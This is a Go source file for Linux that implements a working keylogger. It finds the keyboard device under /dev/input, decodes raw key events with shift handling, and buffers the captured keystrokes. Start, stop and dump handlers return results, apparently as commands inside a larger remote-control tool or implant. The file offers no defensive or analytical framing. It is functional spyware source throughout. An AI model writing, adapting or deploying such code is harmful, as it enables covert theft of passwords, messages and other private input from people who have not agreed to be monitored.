//go:build linux

package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

var (
	klMu    sync.Mutex
	klBuf   strings.Builder
	klOn    bool
	klShift bool
)

var keymap = map[uint16][2]string{
	2: {"1", "!"}, 3: {"2", "@"}, 4: {"3", "#"}, 5: {"4", "$"}, 6: {"5", "%"},
	7: {"6", "^"}, 8: {"7", "&"}, 9: {"8", "*"}, 10: {"9", "("}, 11: {"0", ")"},
	12: {"-", "_"}, 13: {"=", "+"},
	16: {"q", "Q"}, 17: {"w", "W"}, 18: {"e", "E"}, 19: {"r", "R"}, 20: {"t", "T"},
	21: {"y", "Y"}, 22: {"u", "U"}, 23: {"i", "I"}, 24: {"o", "O"}, 25: {"p", "P"},
	26: {"[", "{"}, 27: {"]", "}"},
	30: {"a", "A"}, 31: {"s", "S"}, 32: {"d", "D"}, 33: {"f", "F"}, 34: {"g", "G"},
	35: {"h", "H"}, 36: {"j", "J"}, 37: {"k", "K"}, 38: {"l", "L"},
	39: {";", ":"}, 40: {"'", `"`}, 41: {"`", "~"}, 43: {"\\", "|"},
	44: {"z", "Z"}, 45: {"x", "X"}, 46: {"c", "C"}, 47: {"v", "V"}, 48: {"b", "B"},
	49: {"n", "N"}, 50: {"m", "M"},
	51: {",", "<"}, 52: {".", ">"}, 53: {"/", "?"},
	57: {" ", " "},
}

func keylogStart(dev string) Result {
	klMu.Lock()
	if klOn {
		klMu.Unlock()
		return Result{OK: true, Out: "already running"}
	}
	klOn = true
	klMu.Unlock()

	path := dev
	if path == "" {
		path = findKeyboard()
	}
	if path == "" {
		return Result{OK: false, Err: "no keyboard device found"}
	}
	go klRead(path)
	return Result{OK: true, Out: "keylogging " + path}
}

func keylogStop() Result {
	klMu.Lock()
	klOn = false
	klMu.Unlock()
	return Result{OK: true, Out: "stopped"}
}

func keylogDump(clear bool) Result {
	klMu.Lock()
	defer klMu.Unlock()
	out := klBuf.String()
	if clear {
		klBuf.Reset()
	}
	if out == "" {
		return Result{OK: true, Out: "(empty)"}
	}
	return Result{OK: true, Out: out}
}

func findKeyboard() string {
	if m, _ := filepath.Glob("/dev/input/by-path/*kbd*"); len(m) > 0 {
		return m[0]
	}
	for i := 0; i < 16; i++ {
		p := fmt.Sprintf("/dev/input/event%d", i)
		if hasKeyBit(p) {
			return p
		}
	}
	return ""
}

// EVIOCGBIT(0, 8) = 0x80084520 — check the EV_KEY capability bit
func hasKeyBit(path string) bool {
	f, err := os.Open(path)
	if err != nil {
		return false
	}
	defer f.Close()
	buf := make([]byte, 8)
	_, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(),
		0x80084520, uintptr(unsafe.Pointer(&buf[0])))
	if errno != 0 {
		return false
	}
	return buf[1]&0x02 != 0
}

func klRead(path string) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()
	buf := make([]byte, 24) // struct input_event on 64-bit
	for {
		if _, err := io.ReadFull(f, buf); err != nil {
			return
		}
		typ := binary.LittleEndian.Uint16(buf[16:18])
		code := binary.LittleEndian.Uint16(buf[18:20])
		val := int32(binary.LittleEndian.Uint32(buf[20:24]))
		if typ != 1 { // EV_KEY
			continue
		}
		switch code {
		case 42, 54: // shift
			klShift = val != 0
		case 28: // enter
			if val == 1 {
				klAppend("\n")
			}
		case 14: // backspace
			if val == 1 {
				klAppend("\b")
			}
		case 15: // tab
			if val == 1 {
				klAppend("\t")
			}
		default:
			if val != 1 {
				continue
			}
			if m, ok := keymap[code]; ok {
				if klShift {
					klAppend(m[1])
				} else {
					klAppend(m[0])
				}
			}
		}
	}
}

func klAppend(s string) {
	klMu.Lock()
	klBuf.WriteString(s)
	klMu.Unlock()
}